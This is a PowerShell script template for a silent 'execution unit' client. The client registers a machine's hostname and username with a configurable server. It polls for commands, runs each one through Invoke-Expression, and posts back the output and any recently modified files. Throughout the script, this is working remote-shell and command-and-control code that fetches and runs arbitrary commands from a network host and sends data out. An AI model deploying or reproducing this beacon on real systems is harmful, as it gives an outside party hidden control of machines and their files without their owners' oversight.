# PowerShell Execution Unit
$$serverUrl = $$env:SERVER_URL
if (-not $$serverUrl) {{
    $$serverUrl = "{base_url}"
}}

# Get environment info for stable identification
$$hostname = $$env:COMPUTERNAME
$$username = $$env:USERNAME

# Generate stable client ID
$$md5 = [System.Security.Cryptography.MD5]::Create()
$$inputString = "$$($$hostname.ToLower()):$$($$username.ToLower())"
$$hash = $$md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($$inputString))
$$hashString = ($$hash | ForEach {{ "{{0:x2}}" -f $$_ }}) -join ''
$$stableId = $$hashString.Substring(0, 12)

# Execution unit runs silently unless executing commands

# File upload helper function using .NET HttpClient for proper multipart handling
function Upload-ResultFiles {{
    param(
        [string]$$CommandId,
        [string]$$ServerUrl,
        [string[]]$$FilePaths
    )

    if (-not $$FilePaths -or $$FilePaths.Count -eq 0) {{
        return $$null
    }}

    try {{
        # Use Add-Type to ensure we have access to required .NET classes
        Add-Type -AssemblyName System.Net.Http

        $$httpClient = [System.Net.Http.HttpClient]::new()
        $$form = [System.Net.Http.MultipartFormDataContent]::new()

        foreach ($$filePath in $$FilePaths) {{
            if (Test-Path $$filePath) {{
                $$fileName = Split-Path $$filePath -Leaf
                $$fileContent = [System.IO.File]::ReadAllBytes($$filePath)
                $$byteArrayContent = [System.Net.Http.ByteArrayContent]::new($$fileContent)
                $$byteArrayContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
                $$form.Add($$byteArrayContent, "files", $$fileName)
            }}
        }}

        $$response = $$httpClient.PostAsync("$$ServerUrl/upload_files/$$CommandId", $$form).Result
        $$responseContent = $$response.Content.ReadAsStringAsync().Result

        $$httpClient.Dispose()
        $$form.Dispose()

        if ($$response.IsSuccessStatusCode) {{
            return ($$responseContent | ConvertFrom-Json)
        }} else {{
            Write-Host "Upload failed with status: $$($$response.StatusCode)" -ForegroundColor Red
            return $$null
        }}
    }} catch {{
        Write-Host "Error uploading files: $$($$_.Exception.Message)" -ForegroundColor Red
        return $$null
    }}
}}

# Smart file detection function - finds all recently modified files
function Find-OutputFiles {{
    param(
        [string]$$Command,
        [string]$$WorkingDir = (Get-Location).Path
    )

    $$outputFiles = @()

    # Look for ALL recently created/modified files (within last 5 seconds)
    $$recentTime = (Get-Date).AddSeconds(-5)

    try {{
        $$files = Get-ChildItem -Path $$WorkingDir -File -Recurse -ErrorAction SilentlyContinue |
                 Where-Object {{ $$_.LastWriteTime -gt $$recentTime -and -not $$_.PSIsContainer }}
        $$outputFiles = $$files.FullName
    }} catch {{
        # If recursive search fails, try current directory only
        try {{
            $$files = Get-ChildItem -Path $$WorkingDir -File -ErrorAction SilentlyContinue |
                     Where-Object {{ $$_.LastWriteTime -gt $$recentTime }}
            $$outputFiles = $$files.FullName
        }} catch {{
            # If all else fails, return empty array
            $$outputFiles = @()
        }}
    }}

    return $$outputFiles
}}

# Register client to server silently
try {{
    $$registerData = @{{
        client_id = $$stableId
        hostname = $$hostname
        username = $$username
    }} | ConvertTo-Json -Compress

    Invoke-RestMethod -Uri "$$serverUrl/register_client" -Method POST -Body $$registerData -ContentType "application/json" -UseBasicParsing | Out-Null
}} catch {{
    # Registration failed, continue with local stable ID
}}

# Main execution: wait for one command or timeout after 10 seconds
$$timeout = 10
$$elapsed = 0
$$commandExecuted = $$false

while ($$elapsed -lt $$timeout -and -not $$commandExecuted) {{
    try {{
        $$response = Invoke-RestMethod -Uri "$$serverUrl/next_command?client_id=$$stableId&hostname=$$hostname&username=$$username" -Method GET -TimeoutSec 5

        if ($$response.command) {{
            $$commandId = $$response.command_id
            Write-Host "[$$stableId] Executing: $$($$response.command)" -ForegroundColor Yellow

            # Get files before execution for comparison
            $$beforeFiles = Find-OutputFiles -Command $$response.command

            try {{
                $$result = Invoke-Expression $$response.command 2>&1 | Out-String
                $$status = "completed"
            }} catch {{
                $$result = $$_.Exception.Message
                $$status = "failed"
            }}

            Write-Host "[$$stableId] Result:" -ForegroundColor Magenta
            $$result.Split("`n") | ForEach {{ if ($$_ -ne "") {{ Write-Host " $$_" -ForegroundColor White }} }}
            Write-Host ""

            # Find new output files
            $$afterFiles = Find-OutputFiles -Command $$response.command
            $$newFiles = $$afterFiles | Where-Object {{ $$_ -notin $$beforeFiles }}

            # Submit result to server if command_id is available
            if ($$commandId) {{
                try {{
                    # Determine result type
                    $$resultType = "text"
                    if ($$newFiles -and $$newFiles.Count -gt 0) {{
                        if ($$result.Trim()) {{
                            $$resultType = "mixed"
                        }} else {{
                            $$resultType = if ($$newFiles.Count -gt 1) {{ "files" }} else {{ "file" }}
                        }}
                    }}

                    $$resultData = @{{
                        command_id = $$commandId
                        result = $$result
                        status = $$status
                        result_type = $$resultType
                    }} | ConvertTo-Json -Compress

                    Invoke-RestMethod -Uri "$$serverUrl/submit_result" -Method POST -Body $$resultData -ContentType "application/json" -UseBasicParsing | Out-Null
                    Write-Host "[$$stableId] Result submitted successfully" -ForegroundColor Green

                    # Upload files if any were created
                    if ($$newFiles -and $$newFiles.Count -gt 0) {{
                        Write-Host "[$$stableId] Uploading $$($$newFiles.Count) output files..." -ForegroundColor Yellow
                        $$uploadResult = Upload-ResultFiles -CommandId $$commandId -ServerUrl $$serverUrl -FilePaths $$newFiles
                        if ($$uploadResult) {{
                            Write-Host "[$$stableId] Files uploaded successfully: $$($$uploadResult.uploaded_files.Count) files" -ForegroundColor Green
                        }}
                    }}

                }} catch {{
                    Write-Host "[$$stableId] Failed to submit result: $$($$_.Exception.Message)" -ForegroundColor Red
                }}
            }}

            $$commandExecuted = $$true
            Write-Host "[$$stableId] Command completed" -ForegroundColor Green
        }} else {{
            Start-Sleep -Seconds 1
            $$elapsed++
        }}
    }} catch {{
        Write-Host "[$$stableId] Error checking for commands: $$($$_.Exception.Message)" -ForegroundColor Red
        Start-Sleep -Seconds 1
        $$elapsed++
    }}
}}

# Create skip transcript flag if no command was received
if (-not $$commandExecuted) {{
    $$skipTranscriptFlag = "SKIP_TRANSCRIPT.flag"
    "NO_COMMAND_RECEIVED" | Out-File -FilePath $$skipTranscriptFlag -Encoding UTF8
}}
